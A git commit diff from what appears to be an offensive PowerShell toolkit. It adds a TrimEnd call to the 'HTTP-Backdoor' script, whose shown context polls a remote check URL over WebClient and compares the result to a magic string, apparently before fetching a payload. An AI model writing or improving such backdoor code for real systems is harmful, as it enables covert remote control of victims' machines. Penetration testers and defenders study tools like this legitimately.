1d1ac9806566f8c6c0c1b806446321899253c0bd
john edwards <edwards.aus@hotmail.com>
2017-04-11 08:19:45 +1000

    Issue #51 addition: HTTP-Backdoor MagicString Comparison improved by adding TrimEnd to ensure comparison is seamless for various server OSs.

--- Backdoors/HTTP-Backdoor.ps1
+++ Backdoors/HTTP-Backdoor.ps1
@@ -172,6 +172,7 @@ function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, 
     start-sleep -seconds 5
     $webclient = New-Object System.Net.WebClient
     $filecontent = $webclient.DownloadString("$CheckURL")
+    $filecontent = $filecontent.TrimEnd()
     if($filecontent -eq $MagicString)
     {
        
